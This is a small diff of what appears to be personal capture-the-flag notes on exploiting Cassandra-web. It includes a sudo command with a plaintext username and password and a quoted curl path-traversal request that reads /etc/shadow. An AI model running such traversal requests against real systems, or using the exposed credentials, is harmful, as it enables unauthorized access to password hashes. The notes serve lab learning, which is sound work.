@@ -104,7 +104,7 @@ Cassandra-web, rubygems application
 Start the application on a different port:  
 `sudo /usr/local/bin/cassandra-web -B 127.0.0.1:3001 -u cassie -p SecondBiteTheApple330  &` 
 
-I tried to set up a tunnel to use the previously used cassandra python exploit but was unable to connect to the agent.
+I tried to set up a tunnel to use the cassandra python exploit but was unable to connect to the agent.
 
 I found this in a guide:  
 `curl --path-as-is http://localhost:3001/../../../../../../../../../etc/shadow`
